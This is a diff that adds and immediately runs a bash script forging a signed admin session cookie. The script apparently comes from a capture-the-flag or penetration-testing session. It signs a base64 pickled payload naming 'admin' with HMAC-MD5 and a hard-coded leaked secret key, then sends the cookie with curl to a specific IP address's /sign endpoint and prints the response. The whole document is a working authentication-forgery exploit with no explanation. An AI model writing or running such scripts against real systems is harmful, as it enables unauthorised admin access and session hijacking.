@@ -1,0 +1,31 @@
+cat > admin_cookie_timeout.sh <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+
+HOST="16.171.27.6:8080"
+SECRET="korean_secret_key_prrrrrrrrrrrrrr_remove_it_before_deploy"
+MSG="gASVEwAAAAAAAAB9lIwEbmFtZZSMBWFkbWlulHMu"
+
+SIG=$(printf '%s' "$MSG" | openssl dgst -md5 -mac HMAC -macopt "key:${SECRET}" -binary | openssl base64 | tr -d '\n')
+COOKIE="!${SIG}?${MSG}"
+
+echo "[*] Using COOKIE=$COOKIE"
+echo "[*] Sending request with 10s max time..."
+
+# curl with detailed trace to file for debugging, and a 10s overall timeout
+TRACE="/tmp/curl_trace.txt"
+OUT="/tmp/admin_out.html"
+: > "$TRACE"
+curl -v --max-time 10 --trace-ascii "$TRACE" -b "name=${COOKIE}" "http://${HOST}/sign" -o "$OUT" || echo "[!] curl exited nonzero (timed out or error). see $TRACE"
+
+echo
+echo "[*] First 200 lines of response file ($OUT):"
+sed -n '1,200p' "$OUT" || echo "[!] no response body saved"
+
+echo
+echo "[*] curl trace (last 100 lines) for debugging:"
+tail -n 100 "$TRACE" || true
+SH
+
+chmod +x admin_cookie_timeout.sh
+./admin_cookie_timeout.sh
